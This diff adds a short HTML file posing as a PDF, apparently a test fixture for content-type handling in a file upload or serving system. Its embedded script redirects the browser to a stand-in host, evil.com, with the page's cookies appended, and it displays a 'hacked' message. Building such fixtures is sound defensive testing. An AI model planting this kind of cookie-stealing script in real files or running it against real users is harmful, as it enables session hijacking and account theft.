@@ -1,0 +1,11 @@
+<html>
+<head><title>Malicious PDF</title></head>
+<body>
+<script>
+  // This is an HTML file disguised as a PDF
+  // If the system serves this with wrong content-type, the browser might execute this
+  document.location = 'http://evil.com/steal?cookie=' + document.cookie;
+</script>
+<h1>You have been hacked!</h1>
+</body>
+</html>
